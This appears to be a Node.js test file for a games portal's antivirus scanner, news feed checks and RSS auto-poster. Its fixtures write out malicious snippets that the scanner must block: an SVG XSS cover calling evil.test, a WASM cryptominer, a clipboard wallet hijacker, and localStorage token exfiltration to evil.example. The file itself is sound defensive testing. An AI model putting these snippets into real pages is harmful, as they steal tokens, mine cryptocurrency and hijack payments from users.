#!/usr/bin/env node
// Автотесты усиленного антивируса Games (v1.1), CI-сканера заявок,
// новостной ленты по 6 категориям и RSS/Atom автопостера.
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { loadGamesAntivirus, scanCommunitySubmissions, scanNewsFeedFile } from '../scripts/scan-submission-antivirus.mjs';
import { parseRssOrAtom, makeSafeNewsItem, mergeNewsFeeds } from '../scripts/auto-post-news.mjs';

const testDir = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(testDir, '../..');

const av = await loadGamesAntivirus();

// 1. Версия и 10-проходный контракт антивируса
assert.equal(av.VERSION, '1.1', 'GamesAntivirus must be v1.1');
const cleanGame = av.scanGameSync({
  title: 'Star Jumper',
  sourceType: 'html',
  htmlCode: '<!DOCTYPE html><html><body><canvas id="c"></canvas><script>const x = 1 + 2;</script></body></html>',
  coverDataUrl: 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="#1b2838"/></svg>'),
});
assert.equal(cleanGame.verdict, 'clean', 'Clean HTML5 game + safe SVG cover must be clean');
assert.equal(cleanGame.passCount, 10, 'Antivirus must execute exactly 10 passes');
assert.equal(cleanGame.riskScore, 0, 'Clean game risk score must be 0');

// 2. Блокировка заражённой SVG-обложки (SVG XSS) и бинарного полиглота
const xssSvg = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch("https://evil.test")</script></svg>');
assert.equal(av.scanCoverDataUrl(xssSvg).verdict, 'blocked', 'SVG XSS cover must be blocked');
const polyglotCover = 'data:image/png;base64,TVqQAAMAAAAEAAAA';
assert.equal(av.scanCoverDataUrl(polyglotCover).verdict, 'blocked', 'PE/MZ polyglot image cover must be blocked');
const gameWithBadCover = av.scanGameSync({
  title: 'Good code bad cover',
  sourceType: 'url',
  playUrl: 'https://m98978672-boop.github.io/games/country-atlas/index.html',
  coverDataUrl: xssSvg,
});
assert.equal(gameWithBadCover.verdict, 'blocked', 'Game with infected SVG cover must be blocked');

// 3. Новые сигнатуры v1.1: WASM-майнер, клиппер криптокошелька, кража localStorage
const wasmMiner = av.scanGameSync({
  title: 'Miner',
  sourceType: 'html',
  htmlCode: '<script>WebAssembly.instantiate(buf).then(() => start("cryptonight", "stratum+tcp://pool"));</script>',
});
assert.equal(wasmMiner.verdict, 'blocked', 'WASM cryptominer must be blocked');

const clipper = av.scanGameSync({
  title: 'Clipper',
  sourceType: 'html',
  htmlCode: '<script>navigator.clipboard.writeText("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");</script>',
});
assert.equal(clipper.verdict, 'blocked', 'Clipboard crypto address hijacker must be blocked');

const exfil = av.scanGameSync({
  title: 'Exfil',
  sourceType: 'html',
  htmlCode: '<script>const d = localStorage.getItem("token"); const img = new Image(); img.src = "https://evil.example/?d=" + d;</script>',
});
assert.equal(exfil.verdict, 'blocked', 'localStorage exfiltration via Image().src must be blocked');

// 4. Антивирус для новостей (scanNewsItemSync)
assert.equal(
  av.scanNewsItemSync({ title: 'Нормальная новость о науке', summary: 'Короткое описание', body: ['Текст статьи.'], sourceUrl: 'https://nplus1.ru/' }).ok,
  true,
  'Clean news item must pass scanNewsItemSync'
);
assert.equal(
  av.scanNewsItemSync({ title: 'Вредная <script>alert(1)</script>', sourceUrl: 'https://example.com/' }).ok,
  false,
  'Script injection in news item must be blocked'
);
assert.equal(
  av.scanNewsItemSync({ title: 'Новость с сокращателем', sourceUrl: 'https://bit.ly/3phish' }).ok,
  false,
  'Shortened URL in news item must be blocked'
);

// 5. Проверка site/news-feed.json (6 категорий, автопост, 0 угроз)
const feed = JSON.parse(await readFile(path.join(repoRoot, 'site/news-feed.json'), 'utf8'));
assert.equal(feed.autoPost?.enabled, true, 'autoPost must be enabled in news-feed.json');
assert.ok(Array.isArray(feed.items) && feed.items.length >= 10, 'news-feed.json must have at least 10 seed articles');
const presentCats = new Set(feed.items.map((x) => x.category));
for (const reqCat of ['games', 'tech', 'science', 'world', 'security', 'facts']) {
  assert.ok(presentCats.has(reqCat), `news-feed.json must cover category "${reqCat}"`);
}
const newsScanResults = await scanNewsFeedFile(av);
assert.equal(newsScanResults.filter((r) => r.verdict === 'blocked').length, 0, 'All news-feed.json items must pass antivirus');

// 6. Проверка community-games.json через CI-сканер
const commScan = await scanCommunitySubmissions(av);
assert.ok(commScan.length >= 1, 'Community catalog must have games to scan');
assert.equal(commScan.filter((r) => r.verdict === 'blocked').length, 0, 'All community games must pass CI antivirus');

// 7. Проверка парсера RSS 2.0 и Atom + фильтрации угроз в mergeNewsFeeds
const rssSample = `<?xml version="1.0"?><rss version="2.0"><channel>
  <item>
    <title><![CDATA[Космический телескоп открыл новую экзопланету]]></title>
    <link>https://nplus1.ru/news/2026/11/16/exoplanet</link>
    <description><![CDATA[<p>Учёные подтвердили наличие атмосферы &mdash; подробности исследования.</p>]]></description>
    <pubDate>Mon, 16 Nov 2026 12:00:00 GMT</pubDate>
    <category>Космос</category>
  </item>
  <item>
    <title>Вредоносная ссылка</title>
    <link>https://bit.ly/phishing123</link>
    <description>Попытка просунуть сокращатель в автопост.</description>
  </item>
</channel></rss>`;
const parsedRss = parseRssOrAtom(rssSample);
assert.equal(parsedRss.length, 2, 'RSS parser must extract items');
const sourceMeta = { id: 'nplus1', category: 'science', name: 'N+1', icon: '🔬', accent: 'indigo' };
const incoming = parsedRss.map((r) => makeSafeNewsItem(r, sourceMeta));
const merged = mergeNewsFeeds(feed.items, incoming, av);
assert.equal(merged.added, 1, 'mergeNewsFeeds must add clean RSS item and drop shortened phishing URL');

const atomSample = `<?xml version="1.0"?><feed xmlns="http://www.w3.org/2005/Atom">
  <entry>
    <title>Новый релиз WebGPU для браузеров</title>
    <link rel="alternate" href="https://habr.com/ru/news/999999/"/>
    <summary>Короткий пересказ обновления стандарта WebGPU для браузерных игр.</summary>
    <updated>2026-11-16T10:00:00Z</updated>
  </entry>
</feed>`;
const parsedAtom = parseRssOrAtom(atomSample);
assert.equal(parsedAtom.length, 1, 'Atom parser must extract entries');
assert.equal(parsedAtom[0].link, 'https://habr.com/ru/news/999999/', 'Atom link must be extracted');

// 8. Проверка HTML-витрины (site/index.html + корневой index.html) и GitHub workflow автопоста
const siteHtml = await readFile(path.join(repoRoot, 'site/index.html'), 'utf8');
const rootHtml = await readFile(path.join(repoRoot, 'index.html'), 'utf8');
for (const [label, html] of [['site/index.html', siteHtml], ['index.html', rootHtml]]) {
  for (const marker of ['portal-news-panel', 'news-teaser-strip', 'news-reader-modal', 'news-compose-modal', 'data-portal-tab="news"', 'data-open-antivirus="file"']) {
    assert.ok(html.includes(marker), `${label} must include ${marker}`);
  }
  const forbiddenEngineRe = new RegExp(['rat', 'core'].join(''), 'i');
  assert.equal(forbiddenEngineRe.test(html), false, `${label} must stay strictly isolated from internal engine`);
}
assert.ok(siteHtml.includes('src="news-hub.js"'), 'site/index.html must load news-hub.js');
assert.ok(rootHtml.includes('src="site/news-hub.js"'), 'root index.html must load site/news-hub.js');

const workflowYml = await readFile(path.join(repoRoot, '.github/workflows/auto-news.yml'), 'utf8');
assert.ok(workflowYml.includes("cron: '0 */6 * * *'"), 'auto-news workflow must schedule cron every 6 hours');
assert.ok(workflowYml.includes('auto-post-news.mjs'), 'auto-news workflow must run auto-post-news.mjs');
assert.ok(workflowYml.includes('scan-submission-antivirus.mjs'), 'auto-news workflow must verify feed with antivirus');

console.log('OK: Games Antivirus v1.1, CI submission scanner, News Hub (6 categories) & Auto-Poster tests passed.');
